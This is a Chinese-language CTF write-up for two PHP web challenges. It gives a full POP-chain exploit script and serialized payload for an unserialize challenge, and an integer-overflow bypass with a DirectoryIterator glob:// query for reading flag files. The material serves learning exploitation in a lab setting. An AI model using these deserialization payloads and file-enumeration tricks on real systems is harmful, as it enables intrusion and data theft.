@@ -1,0 +1,224 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<p>这个比赛早在二月底就结束了，其实很早就想写wp了，但是有很多知识点没写，就拖到现在了。</p>
+<h1>easy unserialize</h1>
+<pre><code class="language-php">&lt;?php
+/**
+ * @Author: F10wers_13eiCheng
+ * @Date:   2022-02-01 11:25:02
+ * @Last Modified by:   F10wers_13eiCheng
+ * @Last Modified time: 2022-02-07 15:08:18
+ */
+include("./HappyYear.php");
+
+class one {
+    public $object;
+
+    public function MeMeMe() {
+        array_walk($this, function($fn, $prev){
+            if ($fn[0] === "Happy_func" &amp;&amp; $prev === "year_parm") {
+                global $talk;
+                echo "$talk"."&lt;/br&gt;";
+                global $flag;
+                echo $flag;
+            }
+        });
+    }
+
+    public function __destruct() {
+        @$this-&gt;object-&gt;add();
+    }
+
+    public function __toString() {
+        return $this-&gt;object-&gt;string;
+    }
+}
+
+class second {
+    protected $filename;
+
+    protected function addMe() {
+        return "Wow you have sovled".$this-&gt;filename;
+    }
+
+    public function __call($func, $args) {
+        call_user_func([$this, $func."Me"], $args);
+    }
+}
+
+class third {
+    private $string;
+
+    public function __construct($string) {
+        $this-&gt;string = $string;
+    }
+
+    public function __get($name) {
+        $var = $this-&gt;$name;
+        $var[$name]();
+    }
+}
+
+if (isset($_GET["ctfshow"])) {
+    $a=unserialize($_GET['ctfshow']);
+    throw new Exception("高一新生报道");
+} else {
+    highlight_file(__FILE__);
+}</code></pre>
+<p>这个题目有很多值得学习的冷知识，一起来看看吧。</p>
+<p>有三个类，一看就知道是<strong><span style="color:#fe2c24;"><span style="background-color:#f3f3f4;">pop</span></span></strong>链，有<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">throw new Exception();</span></strong></span>就知道要利用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">GC回收机制</span></strong></span>。还不知道怎么构造<strong><span style="color:#fe2c24;"><span style="background-color:#f3f3f4;">pop链</span></span></strong>或者不知道<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">GC回收</span></strong></span>是什么的可以看我前面写的文章</p>
+<p><a href="https://blog.csdn.net/qq_51295677/article/details/123425199?spm=1001.2014.3001.5501" title="PHP之序列化与反序列化(POP链篇)_errorr0的博客-CSDN博客">PHP之序列化与反序列化(POP链篇)_errorr0的博客-CSDN博客</a><a href="https://blog.csdn.net/qq_51295677/article/details/123520193?spm=1001.2014.3001.5501" title="浅谈PHP中GC回收机制的利用_errorr0的博客-CSDN博客">浅谈PHP中GC回收机制的利用_errorr0的博客-CSDN博客</a></p>
+<p>这个题目对我而言比较难的一个点就是<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">pop链</span></strong></span>比较难凑，也就是说一眼看不出来。这个时候做题的思路就是随便找一个魔术方法，然后分析从哪到达这个魔术方法以及这个方法又会到哪去。</p>
+<p>先分析几个冷门的知识。</p>
+<h2>第一个冷门知识</h2>
+<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__call($func, $args)</span></strong></span>和<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__get($name)</span></strong></span>中的变量如何控制：</p>
+<pre><code class="language-php">&lt;?php
+class errorr0 {
+    public $object;
+
+    public function __construct()
+    {
+        $this-&gt;object = new errorr1();
+        echo "__construct()\n";
+        $this-&gt;object-&gt;string1;
+    }
+}
+class errorr1 {
+    public $filename;
+    public function __get($a)
+    {
+        $this-&gt;filename = new errorr2();
+        echo "__toString()\n";
+		
+		
+        echo $a."\n";
+        $this-&gt;filename-&gt;function1("bbb");
+    }
+}
+class errorr2 {
+    private $string;
+
+    public function __call($a,$b)
+    {
+        echo "__call()\n";
+		
+		
+        echo $a."\n";
+		
+        var_dump($b);
+    }
+}
+
+$a = new errorr0();
+
+?&gt;</code></pre>
+<p></p>
+<p><img alt="" height="872" src="image\c9f35fda7ded417e934ef806684fd77c.png" width="1200"/></p>
+<p></p>
+<p>可见如果一个不可访问的属性被访问且调用了<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__get()</span></strong></span>方法后会将这个属性的值传给<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__get()</span></strong></span>的参数。 <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__call()</span></strong></span>也是一个道理，如果调用了一个不存在或不可访问的函数则会把函数名赋给<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__call()</span></strong></span>中的第一个变量，函数中的值则会赋给第二个参数，如上图。</p>
+<p></p>
+<h2>第二个冷门知识</h2>
+<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">call_user_func();</span></strong></span>这个函数或许经常见，但如果是这个<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">call_user_func([$this, $func."Me"], $args);</span></strong></span>的话呢？也就是说，第一个参数是数组。直接上测试图解释：</p>
+<p><img alt="" height="539" src="image\7a4a269f9dfe4b36a8c25345350bd496.png" width="1200"/></p>
+<p> 可以看到，如果是数组的话，数组的第一个参数做类，第二个参数做方法。后面的"world" 做函数的参数。</p>
+<h2> 第三个冷门知识</h2>
+<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">array_walk()</span></strong></span>函数</p>
+<p><img alt="" height="725" src="image\4df0f86767954c018c8f4fef3590ca37.png" width="1038"/></p>
+<p><img alt="" height="347" src="image\7d6a8f758bc7460a818ecddfd355507a.png" width="1200"/></p>
+<p></p>
+<p><img alt="" height="361" src="image\0497f86f2aaf43519c1ca47aae86b88b.png" width="1200"/></p>
+<p></p>
+<p>这是菜鸟教程给的两个例子，可以了解大概的意思，我还是啰嗦的解释两句：<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">array_walk()</span></strong></span>第一个参数是选择一个数组，第二个参数放一个函数，函数内的两个参数对选择的那个数组进行分别进行值、键匹配。但是！！题目给的是一个<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$this</span></strong></span>什么意思呢，就是遍历一个类，也就是说原本应该是匹配键的那个参数，现在会把一个变量当键匹配，而值就是本应该的值，这个时候我们的骚操作就是把值修改为数组就可以让<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$fn</span></strong></span>变为数组，最后匹配<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$fn[0]</span></strong></span>的时候通过就可以了。</p>
+<p></p>
+<h2><strong>第四个冷门知识</strong></h2>
+<p>其实说这个是冷门知识比较牵强，可能对我来说比较坑吧！！</p>
+<p><img alt="" height="115" src="image\3d557449eb0e4fefb26b7c7309934692.png" width="455"/></p>
+<p></p>
+<p><img alt="" height="132" src="image\957e2479ddb643b586cc8248244066ec.png" width="483"/></p>
+<p> 前面讲过，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">__get()</span></strong></span>中的是由于访问了不可访问的属性，引起的调用，其中的参数值就是那个不能调用的属性，所以<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$name="string"</span></strong></span>，有意思的来了，<strong>$this-&gt;</strong><strong><span style="color:#fe2c24;"><span style="background-color:#f3f3f4;">$</span></span></strong><strong>name</strong>，可以看到我给了红标记，本应该是<strong>$this-&gt;name</strong>的，但是现在是这个，而<strong>$name="string"</strong>，所以最后<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$var = $this-&gt;string</span></strong></span>。</p>
+<p>所以最后其实就是<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$this-&gt;string['string']();</span></strong></span>，我们的目的就是让这个东西可以指向<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::MeMeMe()</span></strong></span>最后就大功告成了。令<strong><span style="background-color:#f3f3f4;">$string = array("string"=&gt;</span><span style="color:#fe2c24;"><span style="background-color:#f3f3f4;">[new one(),"MeMeMe"]</span></span><span style="background-color:#f3f3f4;">);</span></strong>即可以绕过，不要问我为什么可以，我也不晓得，我看官方wp是这样的<img alt="" height="791" src="image\7221cd061a6f4dd5a6a29cdcf60dec1e.png" width="796"/></p>
+<p>我想什么意思应该都知道，但是为啥可以这么用我是第一次知道 ，记住可以这么用就行。</p>
+<h2>构造exp</h2>
+<p>既然难点和重点都分析完了，那构造exp就是除开那些难点的简单<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">pop链</span></strong></span>。分析完我就我不细说了，就是从<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::__destruct()</span></strong></span>方法开始然后访问不存在的<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">add()</span></strong></span>则触发<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">second::__call()</span></strong></span>，然后触发自身的函数<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">second::addMe()</span></strong></span>，在里面有个可以把对象连接字符串的点，所以连接到<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::__toString()</span></strong></span>，再访问一个不可访问的值，连接<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">third::__get()</span></strong></span>，最后到达<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::MeMeMe()</span></strong></span>。</p>
+<p>构造的链子为：首部 --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::__destruct()</span></strong></span> --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">second::__call()</span></strong></span> --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">second::addMe()</span></strong></span> --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::__toString()</span></strong></span> --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">third::__get()</span></strong></span> --&gt; <span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">one::MeMeMe()</span></strong></span> --&gt; 尾部</p>
+<p>exp：</p>
+<pre><code class="language-php">&lt;?php
+
+class one {
+    public $object;
+
+    public $year_parm = array(0=&gt;"Happy_func");
+
+}
+
+class second {
+    public $filename;
+
+}
+
+class third {
+    private $string;
+
+    public function __construct($string) {
+        $this-&gt;string = $string;
+    }
+
+    public function __get($name) {
+        $var = $this-&gt;$name;
+        $var[$name]();
+    }
+}
+
+$a = new one();
+$b = new one();
+$c = new second();
+$d = new third(["string"=&gt;[new one(),"MeMeMe"]]);
+
+$a-&gt;object = $c;
+$c-&gt;filename = $b;
+$b-&gt;object = $d;
+
+$n = NULL;
+$m = array(0=&gt;$a,1=&gt;$n);
+
+
+echo serialize($m);</code></pre>
+<p><img alt="" height="281" src="image\a29c80a99a2e4991a47ca4af30382134.png" width="677"/></p>
+<p></p>
+<p>这两个格子是不可见字符，这个我在前面讲<span style="color:#fe2c24;"><strong>pop链</strong></span>的文章中就提到过了 ，这里的不可见字符为<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">%00</span></strong></span></p>
+<p>把下面这个1改为0实现GC利用。</p>
+<p>最后得到的字符串为：</p>
+<pre><code class="language-php">a:2:{i:0;O:3:"one":2:{s:6:"object";O:6:"second":1:{s:8:"filename";O:3:"one":2:{s:6:"object";O:5:"third":1:{s:13:"%00third%00string";a:1:{s:6:"string";a:2:{i:0;O:3:"one":2:{s:6:"object";N;s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}i:1;s:6:"MeMeMe";}}}s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}}s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}i:0;N;}</code></pre>
+<p><img alt="" height="165" src="image\4b31f1e3d71e4a449241bbd0919cd133.png" width="1169"/></p>
+<h1></h1>
+<h1></h1>
+<h1>easyweb</h1>
+<p>数组键溢出 + PHP原生类读取。原生类知识量有点大，后面笔记补，这里考的原生类中的文件操作，可以百度搜索。</p>
+<p><img alt="" height="460" src="image\dc22e8c4f4b2424ab3d2a59a6305564f.png" width="1032"/></p>
+<p>前端源码提示了<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">source</span></strong></span>,访问得源码</p>
+<p><img alt="" height="818" src="image\5e578ab71e754596b981de480ad83c77.png" width="936"/></p>
+<p> 注意一个问题，第一层这里</p>
+<p><img alt="" height="263" src="image\7980b6bbaeb84e2fb63d13018fe0cb39.png" width="730"/></p>
+<p>这是个等于号，相当于赋值，而对于数组无法赋值的情况就是当键溢出就行，可以看到上一句有<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">++$c</span></strong></span>，也就是说我们设置c为<strong><span style="color:#fe2c24;"><span style="background-color:#f3f3f4;">int可设置的最大值减1</span></span></strong>，等它自增后就可以达到溢出无法赋值的效果 ，不过不晓得为啥我在本地<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">127.0.0.1</span></strong></span>并不能达到上面所说的效果，在服务器上测试倒可以。</p>
+<p><img alt="" height="824" src="image\f5a206eb0b5941ddadb765e7daeab1b2.png" width="893"/></p>
+<p> <img alt="" height="480" src="image\68fb0335f8c44da8b766f0d32bb3ab85.png" width="1200"/></p>
+<p></p>
+<p> 挺明了的，只需要令<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">c = 9223372036854775806</span></strong></span>自增一次溢出就可以了。</p>
+<p></p>
+<p>接下来就是PHP原生类文件读取。</p>
+<blockquote>
+<p>DirectoryIterator: DirectoryIterator类提供了一个查看文件系统目录内容的简单接口。 FilesystemIterator: 文件系统迭代器。<br/> GlobIterator: 与glob()类似的方式迭代文件系统。</p>
+</blockquote>
+<p>随便用一个就行，怎么用直接百度查查，我不细说了。</p>
+<p>这里文件的名是加了md5的虽然可以用burp爆破，不过看wp用正则匹配就很灵性所以我偷个懒，直接照搬好了。</p>
+<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">&amp;a=DirectoryIterator&amp;b=glob://flag[a-z0-9]*.php</span></strong></span></p>
+<p></p>
+<p><img alt="" height="500" src="image\2abeac6dd5394e7c86da186ebe07b255.png" width="1199"/></p>
+<p></p>
+<p>最后直接读：</p>
+<p><img alt="" height="530" src="image\ece6b77453d34b848d47a72f3c16ad28.png" width="1200"/></p>
+<p></p>
+<p></p>
+</div>
+</div>
